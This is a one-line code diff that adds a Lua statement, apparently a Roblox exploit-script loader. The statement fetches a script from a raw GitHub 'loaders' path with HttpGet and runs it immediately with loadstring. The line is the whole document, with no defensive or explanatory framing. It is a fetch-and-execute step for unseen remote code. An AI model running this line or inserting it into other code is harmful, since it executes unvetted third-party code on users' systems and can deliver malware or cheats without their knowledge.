@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/huss-valley-spam7-ioco7zopdzrrjo.lua"))()
